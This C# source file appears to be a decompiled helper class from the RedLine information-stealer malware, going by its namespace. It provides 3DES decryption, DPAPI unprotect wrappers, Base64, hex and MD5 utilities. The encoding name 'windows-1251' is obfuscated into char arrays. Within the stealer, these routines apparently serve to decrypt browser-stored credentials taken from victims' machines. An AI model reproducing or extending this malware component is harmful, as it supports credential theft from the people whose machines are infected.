using System;
using System.Collections.Generic;
using System.Globalization;
using System.Security.Cryptography;
using System.Text;

namespace RedLine.Reburn.Data.Helpers;

public static class CryptoHelper
{
	public static string Decrypt3DES(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
	{
		using TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.IV = iv;
		tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
		tripleDESCryptoServiceProvider.Padding = paddingMode;
		using ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv);
		return Encoding.GetEncoding(new string(new char[12]
		{
			'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
			'5', '1'
		})).GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
	}

	public static string Base64Decode(string input)
	{
		try
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(input));
		}
		catch
		{
			return input;
		}
	}

	public static string EncryptBlob(string rawText)
	{
		return Convert.ToBase64String(ProtectedData.Protect(Encoding.GetEncoding(new string(new char[12]
		{
			'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
			'5', '1'
		})).GetBytes(rawText), (byte[])null, (DataProtectionScope)0));
	}

	public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		return Encoding.UTF8.GetString(DecryptBlob(Encoding.GetEncoding(new string(new char[12]
		{
			'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
			'5', '1'
		})).GetBytes(EncryptedData), dataProtectionScope, entropy));
	}

	public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (EncryptedData != null && EncryptedData.Length != 0)
			{
				return ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
			}
			return null;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] ConvertHexStringToByteArray(string hexString)
	{
		if (hexString.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1] { hexString }));
		}
		byte[] array = new byte[hexString.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = hexString.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	public static string GetMd5Hash(string source)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(source);
		return GetHexString(mD5CryptoServiceProvider.ComputeHash(bytes)).Replace("-", string.Empty);
	}

	private static string GetHexString(IList<byte> bt)
	{
		string text = string.Empty;
		for (int i = 0; i < bt.Count; i++)
		{
			byte num = bt[i];
			int num2 = num & 0xF;
			int num3 = (num >> 4) & 0xF;
			text = ((num3 <= 9) ? (text + num3.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num3 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
			text = ((num2 <= 9) ? (text + num2.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
			if (i + 1 != bt.Count && (i + 1) % 2 == 0)
			{
				text += "-";
			}
		}
		return text;
	}
}
